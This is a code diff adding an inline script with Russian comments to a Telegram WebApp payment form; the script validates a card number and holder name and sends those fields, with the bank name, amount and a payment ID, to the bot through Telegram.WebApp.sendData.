@@ -1,0 +1,57 @@
+<script>
+    // Добавляем обработку payment_id из URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const paymentId = urlParams.get('payment_id');
+    
+    // Модифицируем confirmBtn
+    document.getElementById('confirmBtn').addEventListener('click', async (e) => {
+        e.preventDefault();
+        
+        // Валидация
+        let cardNum = document.getElementById('cardNumber').value.trim().replace(/\s+/g, '');
+        if (cardNum.length < 13) {
+            alert('Введите корректный номер карты (минимум 13 цифр).');
+            return;
+        }
+        if (document.getElementById('cardHolder').value.trim() === '') {
+            alert('Укажите имя владельца карты.');
+            return;
+        }
+        
+        // Собираем данные
+        const paymentData = {
+            payment_id: paymentId,
+            card_number: document.getElementById('cardNumber').value.trim(),
+            card_holder: document.getElementById('cardHolder').value.trim(),
+            bank_name: document.getElementById('bankName').value.trim() || 'Не указан',
+            amount: document.getElementById('amount').value.trim() || '0 ₽',
+            payment_name: document.getElementById('paymentName').value.trim() || 'Оплата'
+        };
+        
+        try {
+            // Отправляем данные в бота через Telegram WebApp
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.sendData(JSON.stringify(paymentData));
+                Telegram.WebApp.close();
+            } else {
+                // Для тестирования вне Telegram
+                alert('Данные для отправки: ' + JSON.stringify(paymentData, null, 2));
+            }
+        } catch (error) {
+            alert('Ошибка при отправке данных: ' + error.message);
+        }
+    });
+    
+    // Показываем payment_id если есть
+    if (paymentId) {
+        const paymentIdDisplay = document.createElement('div');
+        paymentIdDisplay.style.marginTop = '10px';
+        paymentIdDisplay.style.padding = '10px';
+        paymentIdDisplay.style.background = '#eef2f6';
+        paymentIdDisplay.style.borderRadius = '4px';
+        paymentIdDisplay.style.fontSize = '12px';
+        paymentIdDisplay.style.color = '#666';
+        paymentIdDisplay.textContent = 'ID платежа: ' + paymentId;
+        document.querySelector('.card-panel').insertBefore(paymentIdDisplay, document.querySelector('.confirm-btn'));
+    }
+</script>
